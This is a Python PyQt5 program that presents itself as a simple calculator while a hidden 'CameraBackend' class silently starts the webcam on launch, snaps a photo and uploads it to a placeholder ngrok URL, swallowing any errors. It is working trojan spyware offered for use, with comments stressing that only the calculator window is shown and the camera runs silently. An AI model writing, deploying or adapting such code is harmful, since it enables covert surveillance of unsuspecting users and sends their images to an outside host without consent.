import sys, os, requests
from datetime import datetime
from PyQt5.QtWidgets import QApplication, QWidget, QGridLayout, QPushButton, QLineEdit
from PyQt5.QtGui import QFont, QPalette, QColor
from PyQt5.QtCore import Qt
from PyQt5.QtMultimedia import QCamera, QCameraImageCapture

# Backend URL
UPLOAD_URL = "{PASTE YOUR NGROK PUBLIC URL}"

# -----------------------------
# Calculator Window
# -----------------------------
class Calculator(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CALCULATOR")
        self.setFixedSize(300, 400)

        palette = self.palette()
        palette.setColor(QPalette.Window, QColor("#cc0000"))
        self.setPalette(palette)
        self.setAutoFillBackground(True)

        layout = QGridLayout()
        self.setLayout(layout)

        self.display = QLineEdit()
        self.display.setReadOnly(True)
        self.display.setAlignment(Qt.AlignRight)
        self.display.setFont(QFont("Arial", 20))
        self.display.setStyleSheet("background-color: white; color: black; padding: 10px;")
        layout.addWidget(self.display, 0, 0, 1, 4)

        buttons = [
            ("7", 1, 0), ("8", 1, 1), ("9", 1, 2), ("/", 1, 3),
            ("4", 2, 0), ("5", 2, 1), ("6", 2, 2), ("*", 2, 3),
            ("1", 3, 0), ("2", 3, 1), ("3", 3, 2), ("-", 3, 3),
            ("0", 4, 0), ("C", 4, 1), ("=", 4, 2), ("+", 4, 3),
        ]

        for label, row, col in buttons:
            btn = QPushButton(label)
            btn.setFont(QFont("Arial", 16))
            btn.setFixedSize(60, 60)

            if label.isdigit():
                btn.setStyleSheet("background-color: green; color: white;")
            elif label == "C":
                btn.setStyleSheet("background-color: gray; color: white;")
            elif label in "+-*/=":
                btn.setStyleSheet("background-color: blue; color: white;")

            btn.clicked.connect(lambda _, b=label: self.on_click(b))
            layout.addWidget(btn, row, col)

    def on_click(self, label):
        if label == "C":
            self.display.clear()
        elif label == "=":
            try:
                result = str(eval(self.display.text()))
                self.display.setText(result)
            except:
                self.display.setText("Error")
        else:
            self.display.setText(self.display.text() + label)

# -----------------------------
# Background Camera (silent)
# -----------------------------
class CameraBackend:
    def __init__(self):
        self.camera = QCamera()
        self.camera.start()

        self.capture = QCameraImageCapture(self.camera)
        self.capture.imageSaved.connect(self.on_image_saved)

        self.save_dir = os.path.join(os.getcwd(), "CapturedPhotos")
        os.makedirs(self.save_dir, exist_ok=True)

        self.take_photo()

    def take_photo(self):
        filename = datetime.now().strftime("photo_%Y%m%d_%H%M%S.jpg")
        path = os.path.join(self.save_dir, filename)
        self.capture.capture(path)

    def on_image_saved(self, id, file_path):
        self.upload_photo(file_path)

    def upload_photo(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                requests.post(UPLOAD_URL, files=files)
        except:
            pass  # suppress errors silently

# -----------------------------
# Launch Calculator + Background Camera
# -----------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)

    # Start background camera silently
    camera_backend = CameraBackend()

    # Show only calculator window
    calculator_window = Calculator()
    calculator_window.show()


    sys.exit(app.exec_())
